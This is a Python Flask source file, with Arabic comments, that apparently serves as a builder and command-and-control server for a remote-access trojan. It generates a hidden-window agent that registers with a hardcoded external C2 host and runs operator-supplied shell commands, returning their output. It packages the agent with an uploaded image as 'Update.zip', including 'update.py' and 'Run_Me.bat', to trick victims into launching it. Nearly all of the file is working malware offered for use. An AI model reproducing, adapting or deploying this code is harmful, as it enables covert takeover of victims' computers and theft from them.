import os
import time
import uuid
import zipfile
import io
import threading
from flask import Flask, request, jsonify, send_file, send_from_directory

app = Flask(__name__)

# تخزين في الذاكرة
clients = {}
lock = threading.Lock()

# رابط السيرفر حقك (يتحط تلقائي داخل الفايروس اللي يتصنع)
C2_URL = "https://m7kmt-bdr-1.onrender.com"

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

# --- هنا السحر: السيرفر يبني كود الضحية بنفسه ---
def generate_payload():
    payload_code = f"""import os
import time
import uuid
import subprocess
import requests
import platform
import sys

C2_URL = "{C2_URL}"
CID = str(uuid.uuid4())
OS_INFO = platform.system() + " " + platform.release()

def register():
    while True:
        try:
            requests.post(f"{{C2_URL}}/api/register", json={{"id": CID, "os": OS_INFO}}, timeout=10)
            break
        except:
            time.sleep(5)

def poll_commands():
    while True:
        try:
            r = requests.get(f"{{C2_URL}}/api/get_cmd/{{CID}}", timeout=15)
            if r.status_code == 200:
                cmd = r.json().get('cmd')
                if cmd:
                    try:
                        output = subprocess.getoutput(cmd)
                        if not output: output = "Done."
                    except Exception as e:
                        output = str(e)
                    requests.post(f"{{C2_URL}}/api/send_result/{{CID}}", json={{"result": output}}, timeout=15)
        except Exception:
            pass
        time.sleep(3)

if __name__ == "__main__":
    if os.name == 'nt':
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    register()
    poll_commands()
"""
    return payload_code.encode('utf-8')

@app.route('/build', methods=['POST'])
def build():
    if 'image' not in request.files:
        return "No image uploaded", 400
    
    img = request.files['image']
    img_name = img.filename
    
    # توليد الفايروس
    payload_data = generate_payload()
    
    memory_file = io.BytesIO()
    with zipfile.ZipFile(memory_file, 'w', zipfile.ZIP_DEFLATED) as zf:
        # 1. الصورة الحقيقية
        zf.writestr(f"IMG_{img_name}", img.read())
        
        # 2. السكربت (نسميه update.py عشان يشتغل على كل الانظمة)
        zf.writestr("update.py", payload_data)
        
        # 3. ملف تشغيل لويندوز (عشان يشتغل بضغطة)
        zf.writestr("Run_Me.bat", "pythonw update.py\n")
            
    memory_file.seek(0)
    return send_file(memory_file, mimetype='application/zip', as_attachment=True, download_name='Update.zip')

# --- مسارات التحكم ---
@app.route('/api/register', methods=['POST'])
def register():
    data = request.json
    cid = data.get('id')
    with lock:
        clients[cid] = {"last_seen": time.strftime("%H:%M:%S"), "os": data.get('os', 'Unknown'), "cmd": "", "result": ""}
    return jsonify({"status": "ok"})

@app.route('/api/get_cmd/<cid>', methods=['GET'])
def get_cmd(cid):
    with lock:
        if cid in clients:
            clients[cid]['last_seen'] = time.strftime("%H:%M:%S")
            cmd = clients[cid]['cmd']
            clients[cid]['cmd'] = ""
            return jsonify({"cmd": cmd})
    return jsonify({"cmd": ""})

@app.route('/api/send_result/<cid>', methods=['POST'])
def send_result(cid):
    data = request.json
    with lock:
        if cid in clients:
            clients[cid]['result'] = data.get('result', '')
    return jsonify({"status": "ok"})

@app.route('/api/clients', methods=['GET'])
def list_clients():
    with lock:
        return jsonify(clients)

@app.route('/api/send_cmd/<cid>', methods=['POST'])
def send_cmd(cid):
    data = request.json
    with lock:
        if cid in clients:
            clients[cid]['cmd'] = data.get('cmd')
            clients[cid]['result'] = ""
    return jsonify({"status": "ok"})

@app.route('/api/get_result/<cid>', methods=['GET'])
def get_result(cid):
    with lock:
        if cid in clients:
            return jsonify({"result": clients[cid]['result']})
    return jsonify({"result": ""})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))